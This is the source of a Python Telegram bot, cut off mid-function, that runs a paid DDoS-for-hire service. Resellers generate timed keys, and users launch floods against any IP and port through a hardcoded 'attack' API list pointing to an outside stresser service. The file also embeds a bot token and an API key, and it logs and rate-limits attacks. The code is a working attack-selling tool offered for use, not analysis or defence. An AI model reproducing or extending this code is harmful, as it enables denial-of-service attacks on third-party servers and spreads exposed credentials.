import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import sys
import json
from datetime import datetime, timedelta
import time
import requests

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ============= CONFIGURATION =============
BOT_TOKEN = "8628280551:AAHA2VF4Yb_Q0W1enoZz2c0TGiP5kxrU-EY"
BOT_OWNER = 1885926472

# API List for attacks (4 concurrent attacks possible)
API_LIST = [
    "https://app.teamc2.xyz/api/attack?api_key=LMII0G&target={ip}&port={port}&time={time}&concurrent=1",
    "https://app.teamc2.xyz/api/attack?api_key=LMII0G&target={ip}&port={port}&time={time}&concurrent=1",
    "https://app.teamc2.xyz/api/attack?api_key=LMII0G&target={ip}&port={port}&time={time}&concurrent=1",
    "https://app.teamc2.xyz/api/attack?api_key=LMII0G&target={ip}&port={port}&time={time}&concurrent=1",
]

# Settings
DEFAULT_MAX_ATTACK_TIME = 200
DEFAULT_USER_COOLDOWN = 180

# Reseller pricing
RESELLER_PRICING = {
    '12h': {'price': 25, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 50, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 130, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 250, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 750, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 1250, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

# ============= FILE STORAGE (No MongoDB needed!) =============
DATA_FILE = "bot_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {
        "users": {},
        "keys": {},
        "resellers": {},
        "attack_logs": [],
        "settings": {
            "max_attack_time": 200,
            "user_cooldown": 180,
            "concurrent_limit": 4,
            "maintenance_mode": False,
            "maintenance_msg": "🔧 Bot maintenance mein hai. Baad mein try karo.",
            "blocked_ips": [],
            "port_protection": True
        }
    }

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

data = load_data()
bot = telebot.TeleBot(BOT_TOKEN)

# ============= HELPER FUNCTIONS =============
def get_setting(key, default):
    return data["settings"].get(key, default)

def set_setting(key, value):
    data["settings"][key] = value
    save_data(data)

def get_max_attack_time():
    return get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)

def get_user_cooldown_setting():
    return get_setting('user_cooldown', DEFAULT_USER_COOLDOWN)

def get_concurrent_limit():
    return get_setting('concurrent_limit', 4)

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot maintenance mein hai. Baad mein try karo.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def get_port_protection():
    return get_setting('port_protection', True)

def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        bot.reply_to(message, get_maintenance_msg())
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    
    user = data["users"].get(str(user_id))
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            ban_expiry = datetime.fromisoformat(user['ban_expiry'])
            if datetime.now() > ban_expiry:
                user['banned'] = False
                user.pop('ban_expiry', None)
                user.pop('ban_type', None)
                save_data(data)
                return False
            bot.reply_to(message, f"🚫 TEMPORARY BANNED!\n\n⏳ Expiry: {user['ban_expiry']}\n\n📞 Contact Your Seller")
            return True
        bot.reply_to(message, f"🚫 PERMANENTLY BANNED!\n\n📞 Contact Your Seller")
        return True
    return False

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = data["resellers"].get(str(user_id))
    return reseller is not None and not reseller.get('blocked')

def get_reseller(user_id):
    return data["resellers"].get(str(user_id))

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    
    for uid, user in data["users"].items():
        if user.get('username', '').lower() == input_str.lower():
            return int(uid), user.get('username')
    
    for uid, reseller in data["resellers"].items():
        if reseller.get('username', '').lower() == input_str.lower():
            return int(uid), reseller.get('username')
    
    return None, None

def has_valid_key(user_id):
    user = data["users"].get(str(user_id))
    if not user or not user.get('key_expiry'):
        return False
    
    expiry = datetime.fromisoformat(user['key_expiry'])
    if datetime.now() > expiry:
        user['key'] = None
        user['key_expiry'] = None
        save_data(data)
        return False
    return True

def get_time_remaining(user_id):
    user = data["users"].get(str(user_id))
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    
    remaining = datetime.fromisoformat(user['key_expiry']) - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def log_attack(user_id, username, target, port, duration):
    data["attack_logs"].append({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now().isoformat()
    })
    save_data(data)

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def send_long_message(message, text, parse_mode=None):
    max_length = 4000
    if len(text) <= max_length:
        bot.reply_to(message, text, parse_mode=parse_mode)
    else:
        parts = []
        current_part = ""
        lines = text.split('\n')
        for line in lines:
            if len(current_part) + len(line) + 1 > max_length:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        for i, part in enumerate(parts):
            try:
                if i == 0:
                    bot.reply_to(message, part, parse_mode=parse_mode)
                else:
                    bot.send_message(message.chat.id, part, parse_mode=parse_mode)
                time.sleep(0.3)
            except:
                pass

def track_bot_user(user_id, username=None):
    pass

# Attack tracking
_attack_lock = threading.Lock()
active_attacks = {}
user_cooldowns = {}
api_in_use = {}
user_attack_history = {}

def get_user_cooldown(user_id):
    with _attack_lock:
        if str(user_id) not in user_cooldowns:
            return 0
        remaining = (user_cooldowns[str(user_id)] - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[str(user_id)]
            return 0
        return int(remaining)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack in active_attacks.values():
            if attack.get('user_id') == user_id and attack['end_time'] > now:
                return True
        return False

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            active_attacks.pop(k, None)
            api_in_use.pop(k, None)
        return len(active_attacks)

def get_free_api_index():
    with _attack_lock:
        busy_indices = set(api_in_use.values())
        for i in range(len(API_LIST)):
            if i not in busy_indices:
                return i
        return None

# ============= COMMANDS =============

@bot.message_handler(commands=["start"])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
    if is_owner(user_id):
        response = f'''👑 Welcome Owner, {user_name}!

Use /help to see all commands.'''
    elif is_reseller(user_id):
        response = f'''💼 Welcome Reseller, {user_name}!

Use /help to see your commands.'''
    else:
        response = f'''👋 Welcome, {user_name}!

🔐 Commands:
• /redeem <key> - Key redeem karo
• /mykey - Key details dekho
• /status - Attack status dekho
• /chodo <ip> <port> <time> - Attack start karo'''
    
    bot.reply_to(message, response)

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    bot.reply_to(message, f"`{message.from_user.id}`", parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    total_users = len(data["users"])
    maint_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
    uptime_seconds = (datetime.now() - BOT_START_TIME).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    response = f"🏓 Pong!\n\n• Response Time: {response_time}ms\n• Bot Status: 🟢 Online\n• Users: {total_users}\n• Maintenance: {maint_status}\n• Uptime: {hours}h {minutes:02d}m {seconds:02d}s"
    bot.reply_to(message, response)

# ============= KEY MANAGEMENT =============

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    
    if is_owner(user_id):
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\nExample: /gen 1d 1")
            return
        
        duration_str = parts[1].lower()
        duration, duration_label = parse_duration(duration_str)
        if not duration:
            bot.reply_to(message, "❌ Invalid format! Use: s/m/h/d")
            return
        
        try:
            count = int(parts[2])
            if count < 1 or count > 50:
                bot.reply_to(message, "❌ Count 1-50 ke beech hona chahiye!")
                return
        except:
            bot.reply_to(message, "❌ Invalid count!")
            return
        
        generated_keys = []
        for _ in range(count):
            key = f"BGMI-{generate_key(12)}"
            data["keys"][key] = {
                'duration_seconds': int(duration.total_seconds()),
                'duration_label': duration_label,
                'created_at': datetime.now().isoformat(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            generated_keys.append(key)
        save_data(data)
        
        if count == 1:
            bot.reply_to(message, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {duration_label}", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", parse_mode="HTML")
    
    elif reseller:
        if reseller.get('blocked'):
            bot.reply_to(message, "🚫 Aapka panel blocked hai!")
            return
        
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d")
            return
        
        duration_key = parts[1].lower()
        if duration_key not in RESELLER_PRICING:
            bot.reply_to(message, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d")
            return
        
        try:
            count = int(parts[2])
            if count < 1 or count > 20:
                bot.reply_to(message, "❌ Count 1-20 ke beech hona chahiye!")
                return
        except:
            bot.reply_to(message, "❌ Invalid count!")
            return
        
        pricing = RESELLER_PRICING[duration_key]
        price = pricing['price']
        total_price = price * count
        balance = reseller.get('balance', 0)
        
        if balance < total_price:
            bot.reply_to(message, f"❌ Insufficient balance!\n\n💵 Required: {total_price} Rs\n💰 Your Balance: {balance} Rs")
            return
        
        username = message.from_user.username or str(user_id)
        generated_keys = []
        
        for _ in range(count):
            key = f"{username}-{generate_key(10)}"
            data["keys"][key] = {
                'duration_seconds': pricing['seconds'],
                'duration_label': pricing['label'],
                'created_at': datetime.now().isoformat(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            generated_keys.append(key)
        
        new_balance = balance - total_price
        data["resellers"][str(user_id)]['balance'] = new_balance
        data["resellers"][str(user_id)]['total_keys_generated'] = data["resellers"][str(user_id)].get('total_keys_generated', 0) + count
        save_data(data)
        
        if count == 1:
            bot.reply_to(message, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {pricing['label']}\n💰 Balance: {new_balance} Rs", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {pricing['label']}\n💰 Balance: {new_balance} Rs", parse_mode="HTML")
    
    else:
        bot.reply_to(message, "❌ Ye command sirf owner/reseller use kar sakta hai!")

@bot.message_handler(commands=["key"])
def key_details_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /key <key>")
        return
    
    key_input = parts[1]
    key_doc = data["keys"].get(key_input)
    
    if not key_doc:
        bot.reply_to(message, "❌ Key nahi mili!")
        return
    
    response = "═══════════════════════════\n"
    response += "🔑 KEY DETAILS\n"
    response += "═══════════════════════════\n\n"
    response += f"🔑 Key: {key_input}\n"
    response += f"⏰ Duration: {key_doc.get('duration_label', 'Unknown')}\n"
    response += f"📅 Created: {key_doc.get('created_at', 'Unknown')}\n"
    response += f"📊 Status: {'🔴 USED' if key_doc.get('used') else '🟢 UNUSED'}\n"
    
    if key_doc.get('used'):
        response += f"👤 Used By: {key_doc.get('used_by', 'Unknown')}\n"
        response += f"📅 Used At: {key_doc.get('used_at', 'Unknown')}\n"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=["allkeys"])
def all_keys_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    unused_keys = [k for k, v in data["keys"].items() if not v.get('used')]
    used_keys = [k for k, v in data["keys"].items() if v.get('used')]
    
    response = "═══════════════════════════\n"
    response += "ALL KEYS REPORT\n"
    response += f"Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    response += "═══════════════════════════\n\n"
    response += f"🟢 UNUSED KEYS ({len(unused_keys)})\n"
    response += "───────────────────────────\n"
    for i, key in enumerate(unused_keys[:20], 1):
        response += f"{i}. {key}\n"
    response += f"\n🔴 USED KEYS ({len(used_keys)})\n"
    response += "───────────────────────────\n"
    for i, key in enumerate(used_keys[:20], 1):
        response += f"{i}. {key}\n"
    
    send_long_message(message, response)

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /delkey <key>")
        return
    
    key_input = parts[1]
    if key_input in data["keys"]:
        # Also remove key from user if used
        for uid, user in data["users"].items():
            if user.get('key') == key_input:
                user['key'] = None
                user['key_expiry'] = None
        del data["keys"][key_input]
        save_data(data)
        bot.reply_to(message, f"✅ Key `{key_input}` deleted!", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Key nahi mili!")

@bot.message_handler(commands=["del_exp_key"])
def del_exp_key_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    expired_keys = []
    for key, key_doc in data["keys"].items():
        if key_doc.get('used'):
            user_id = key_doc.get('used_by')
            if user_id:
                user = data["users"].get(str(user_id))
                if not user or not user.get('key_expiry') or datetime.fromisoformat(user['key_expiry']) <= datetime.now():
                    expired_keys.append(key)
    
    if not expired_keys:
        bot.reply_to(message, "✅ Koi expired key nahi hai!")
        return
    
    for key in expired_keys:
        del data["keys"][key]
    save_data(data)
    
    bot.reply_to(message, f"✅ {len(expired_keys)} expired keys delete ho gayi!")

@bot.message_handler(commands=["trail"])
def trail_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /trail <hours> <max_users>\nExample: /trail 1 10")
        return
    
    try:
        hours = int(parts[1])
        max_users = int(parts[2])
    except:
        bot.reply_to(message, "❌ Invalid input!")
        return
    
    key = f"TRAIL-{generate_key(10)}"
    data["keys"][key] = {
        'duration_seconds': hours * 3600,
        'duration_label': f"{hours} hours (Trail)",
        'created_at': datetime.now().isoformat(),
        'created_by': BOT_OWNER,
        'created_by_type': 'owner',
        'used': False,
        'used_by': None,
        'used_at': None,
        'max_users': max_users,
        'current_users': 0,
        'is_trail': True
    }
    save_data(data)
    
    bot.reply_to(message, f"✅ Trail Key Generated!\n\n🔑 Key: `{key}`\n⏰ Duration: {hours} hours\n👥 Max Users: {max_users}", parse_mode="Markdown")

@bot.message_handler(commands=["del_trail"])
def del_trail_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() != "confirm":
        bot.reply_to(message, "⚠️ Confirm karne ke liye `/del_trail confirm` likhen.")
        return
    
    count = 0
    for key, key_doc in list(data["keys"].items()):
        if key_doc.get('is_trail'):
            del data["keys"][key]
            count += 1
    save_data(data)
    
    bot.reply_to(message, f"✅ {count} trail keys delete ho gayi!")

@bot.message_handler(commands=["reseller_trail"])
def reseller_trail_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /reseller_trail <hours> <max_users>")
        return
    
    try:
        hours = int(parts[1])
        max_users = int(parts[2])
    except:
        bot.reply_to(message, "❌ Invalid input!")
        return
    
    sent_count = 0
    for reseller_id, reseller in data["resellers"].items():
        if not reseller.get('blocked'):
            key = f"TRAIL-{reseller.get('username', reseller_id)}-{generate_key(8)}"
            data["keys"][key] = {
                'duration_seconds': hours * 3600,
                'duration_label': f"{hours} hours (Reseller Trail)",
                'created_at': datetime.now().isoformat(),
                'created_by': BOT_OWNER,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': max_users,
                'current_users': 0,
                'is_trail': True,
                'reseller_id': int(reseller_id)
            }
            sent_count += 1
    
    save_data(data)
    bot.reply_to(message, f"✅ {sent_count} reseller trail keys generated!")

# ============= USER MANAGEMENT =============

@bot.message_handler(commands=["user"])
def user_info_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /user <id or @username>")
        return
    
    target_id, resolved_name = resolve_user(parts[1])
    if not target_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    user = data["users"].get(str(target_id))
    reseller = data["resellers"].get(str(target_id))
    
    response = "═══════════════════════════\n"
    response += "👤 USER INFORMATION\n"
    response += "═══════════════════════════\n\n"
    response += f"🆔 ID: <code>{target_id}</code>\n"
    if resolved_name:
        response += f"📛 Username: @{resolved_name}\n"
    
    if target_id == BOT_OWNER:
        response += "\n👑 Role: OWNER\n"
    elif reseller:
        response += f"\n💼 Role: RESELLER\n"
        response += f"💰 Balance: {reseller.get('balance', 0)} Rs\n"
        response += f"🔑 Keys Generated: {reseller.get('total_keys_generated', 0)}\n"
        response += f"📊 Status: {'🚫 BLOCKED' if reseller.get('blocked') else '✅ ACTIVE'}\n"
    else:
        response += "\n👤 Role: USER\n"
    
    if user:
        response += "\n═══════════════════════════\n"
        response += "🔑 KEY DETAILS\n"
        response += "═══════════════════════════\n\n"
        
        if user.get('banned'):
            response += "🚫 STATUS: BANNED\n"
        
        if user.get('key'):
            response += f"🔑 Key: <code>{user['key']}</code>\n"
            response += f"⏰ Duration: {user.get('key_duration_label', 'N/A')}\n"
            if user.get('key_expiry'):
                expiry = datetime.fromisoformat(user['key_expiry'])
                if expiry > datetime.now():
                    remaining = get_time_remaining(target_id)
                    response += f"⏳ Remaining: {remaining}\n"
                    response += "✅ Status: ACTIVE\n"
                else:
                    response += "❌ Status: EXPIRED\n"
        else:
            response += "❌ No Active Key\n"
    
    attack_count = len([l for l in data["attack_logs"] if l.get('user_id') == target_id])
    response += f"\n⚔️ Total Attacks: {attack_count}\n"
    response += "\n═══════════════════════════"
    
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    if not data["users"]:
        bot.reply_to(message, "📋 Koi user nahi hai!")
        return
    
    active_users = []
    expired_users = []
    
    for uid, user in data["users"].items():
        if user.get('key_expiry'):
            expiry = datetime.fromisoformat(user['key_expiry'])
            if expiry > datetime.now():
                active_users.append(user)
            else:
                expired_users.append(user)
        else:
            expired_users.append(user)
    
    response = "═══════════════════════════\n"
    response += "ALL USERS REPORT\n"
    response += f"Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    response += "═══════════════════════════\n\n"
    response += f"🟢 ACTIVE USERS ({len(active_users)})\n"
    response += "───────────────────────────\n"
    
    for i, user in enumerate(active_users[:20], 1):
        response += f"{i}. {user.get('username', 'Unknown')} ({user.get('user_id')})\n"
        response += f"   Key: {user.get('key', 'N/A')}\n"
        response += f"   Expiry: {user.get('key_expiry', 'N/A')}\n\n"
    
    response += f"\n🔴 EXPIRED USERS ({len(expired_users)})\n"
    response += "───────────────────────────\n"
    for i, user in enumerate(expired_users[:20], 1):
        response += f"{i}. {user.get('username', 'Unknown')} ({user.get('user_id')})\n"
    
    send_long_message(message, response)

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /extend <id or @username> <time>\nExample: /extend 123456 1d")
        return
    
    target_id, resolved_name = resolve_user(parts[1])
    if not target_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    duration, duration_label = parse_duration(parts[2].lower())
    if not duration:
        bot.reply_to(message, "❌ Invalid duration!")
        return
    
    user = data["users"].get(str(target_id))
    if not user:
        bot.reply_to(message, "❌ User database mein nahi mila!")
        return
    
    if user.get('key_expiry') and datetime.fromisoformat(user['key_expiry']) > datetime.now():
        new_expiry = datetime.fromisoformat(user['key_expiry']) + duration
    else:
        new_expiry = datetime.now() + duration
    
    user['key_expiry'] = new_expiry.isoformat()
    save_data(data)
    
    bot.reply_to(message, f"✅ Time Extended!\n\n👤 User: {target_id}\n⏰ Added: {duration_label}")

@bot.message_handler(commands=["extend_all"])
def extend_all_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /extend_all <time>")
        return
    
    duration, duration_label = parse_duration(parts[1].lower())
    if not duration:
        bot.reply_to(message, "❌ Invalid duration!")
        return
    
    count = 0
    for uid, user in data["users"].items():
        if user.get('key_expiry'):
            expiry = datetime.fromisoformat(user['key_expiry'])
            if expiry > datetime.now():
                new_expiry = expiry + duration
            else:
                new_expiry = datetime.now() + duration
            user['key_expiry'] = new_expiry.isoformat()
            count += 1
    
    save_data(data)
    bot.reply_to(message, f"✅ {count} users ka time extend ho gaya!\n⏰ Added: {duration_label}")

@bot.message_handler(commands=["down"])
def down_key_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /down <id or @username> <time>")
        return
    
    target_id, resolved_name = resolve_user(parts[1])
    if not target_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    duration, duration_label = parse_duration(parts[2].lower())
    if not duration:
        bot.reply_to(message, "❌ Invalid duration!")
        return
    
    user = data["users"].get(str(target_id))
    if not user or not user.get('key_expiry'):
        bot.reply_to(message, "❌ User ke paas active key nahi hai!")
        return
    
    new_expiry = datetime.fromisoformat(user['key_expiry']) - duration
    
    if new_expiry <= datetime.now():
        user['key'] = None
        user['key_expiry'] = None
        bot.reply_to(message, f"⚠️ Key Expired! User {target_id} ki key remove ho gayi!")
    else:
        user['key_expiry'] = new_expiry.isoformat()
        bot.reply_to(message, f"✅ Time Reduced!\n\n👤 User: {target_id}\n⏰ Reduced: {duration_label}")
    
    save_data(data)

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /ban <id or @username>")
        return
    
    target_id, resolved_name = resolve_user(parts[1])
    if not target_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    if target_id == BOT_OWNER:
        bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
        return
    
    if str(target_id) not in data["users"]:
        data["users"][str(target_id)] = {'user_id': target_id, 'username': resolved_name}
    
    data["users"][str(target_id)]['banned'] = True
    data["users"][str(target_id)]['banned_at'] = datetime.now().isoformat()
    save_data(data)
    
    bot.reply_to(message, f"✅ User {target_id} banned!")

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unban <id or @username>")
        return
    
    target_id, resolved_name = resolve_user(parts[1])
    if not target_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    if str(target_id) in data["users"]:
        data["users"][str(target_id)]['banned'] = False
        data["users"][str(target_id)].pop('banned_at', None)
        save_data(data)
        bot.reply_to(message, f"✅ User {target_id} unbanned!")
    else:
        bot.reply_to(message, "❌ User nahi mila!")

@bot.message_handler(commands=["banned"])
def banned_users_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    banned_users = []
    for uid, user in data["users"].items():
        if user.get('banned'):
            banned_users.append(user)
    
    if not banned_users:
        bot.reply_to(message, "📋 Koi banned user nahi hai!")
        return
    
    response = "═══════════════════════════\n🚫 BANNED USERS\n═══════════════════════════\n\n"
    for i, user in enumerate(banned_users[:20], 1):
        response += f"{i}. 👤 {user.get('username', 'Unknown')} ({user.get('user_id')})\n"
    response += f"\n📊 Total Banned: {len(banned_users)}"
    
    send_long_message(message, response)

@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /tban <id or @username> <time>\nExample: /tban 123456 10m")
        return
    
    target_id, resolved_name = resolve_user(parts[1])
    if not target_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    if target_id == BOT_OWNER:
        bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
        return
    
    duration, label = parse_duration(parts[2].lower())
    if not duration:
        bot.reply_to(message, "❌ Invalid duration! Use: 10m, 1h, 1d")
        return
    
    ban_expiry = datetime.now() + duration
    
    if str(target_id) not in data["users"]:
        data["users"][str(target_id)] = {'user_id': target_id, 'username': resolved_name}
    
    data["users"][str(target_id)]['banned'] = True
    data["users"][str(target_id)]['ban_type'] = 'temporary'
    data["users"][str(target_id)]['ban_expiry'] = ban_expiry.isoformat()
    save_data(data)
    
    bot.reply_to(message, f"🚫 User {target_id} ko {label} ke liye ban kar diya gaya hai!")

# ============= RESELLER MANAGEMENT =============

@bot.message_handler(commands=["add_reseller"])
def add_reseller_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /add_reseller <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    if str(reseller_id) in data["resellers"]:
        bot.reply_to(message, "❌ Ye user pehle se reseller hai!")
        return
    
    data["resellers"][str(reseller_id)] = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now().isoformat(),
        'added_by': message.from_user.id,
        'blocked': False,
        'total_keys_generated': 0
    }
    save_data(data)
    
    bot.reply_to(message, f"✅ Reseller added!\n\n👤 User: {reseller_id}\n💰 Balance: 0 Rs")

@bot.message_handler(commands=["remove_reseller"])
def remove_reseller_command(message):
    if not is_owner(message.from_user.id):
